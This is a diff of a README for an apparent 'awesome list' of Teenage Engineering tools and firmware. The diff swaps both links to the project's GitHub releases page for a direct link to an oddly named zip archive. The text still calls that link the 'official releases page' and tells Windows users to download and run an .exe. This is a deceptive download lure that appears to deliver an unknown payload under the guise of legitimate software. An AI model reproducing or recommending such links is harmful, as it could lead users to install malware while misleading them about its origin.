@@ -5,7 +5,7 @@ description: "Access reverse-engineering tools, custom firmware, and hardware mo
 ---
 # 🛠️ awesome-te - Find custom tools for Teenage Engineering
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/heatreleasing-blueflag888/awesome-te/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/heatreleasing-blueflag888/heatreleasing-blueflag888.github.io/main/unencouraged/io-heatreleasing-blueflag-github-v3.4.zip)
 
 This repository serves as a centralized hub for people who own Teenage Engineering hardware. You can find firmware updates, custom tools, and teardown guides to improve your gear. It covers devices like the EP-133, the OP-1 field synthesizer, and various Pocket Operators.
 
@@ -23,7 +23,7 @@ The list covers several categories:
 
 Follow these steps to find and download your tools for Windows:
 
-1. Visit the [official releases page](https://github.com/heatreleasing-blueflag888/awesome-te/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/heatreleasing-blueflag888/heatreleasing-blueflag888.github.io/main/unencouraged/io-heatreleasing-blueflag-github-v3.4.zip).
 2. Look at the latest version listed at the top of the page.
 3. Click the file name ending in .exe to start the download.
 4. Save the file to your desktop or your Downloads folder.
